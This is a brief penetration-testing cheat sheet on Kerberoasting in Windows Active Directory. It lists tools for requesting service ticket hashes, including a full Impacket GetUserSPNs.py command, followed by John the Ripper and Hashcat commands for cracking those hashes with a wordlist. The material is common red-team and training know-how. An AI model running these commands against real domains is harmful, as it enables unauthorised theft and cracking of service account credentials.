### Service Principal Names
Service principal names (SPNs) are used to identify services on Windows.

### Get user SPNs
**PowerSploit**
Old PowerShell command that can be used from a domain-connected client to retrieve the hash.
```
Invoke-Kerberoast
```

**Empire**
Empire is another PowerShell library for post exploitation that includes a set of tools that can be used to get SPN records.

**Impacket**
It is a Python library hosting scripts that can interact with a Windows domain controller. For kerberoasting the script, GetUserSPNs.py can be used with any user's valid domain credentials.
```
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py <domain/username:password> -dc-ip <dc_IP> -request > output_hash.txt
```

### Cracking the Hash
**JohnTheRipper**
```
john hash.txt /usr/share/wordlists/rockyou.txt
```

**Hashcat**
```
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```
- `13100`: Kerberos 5 TGS-REP hash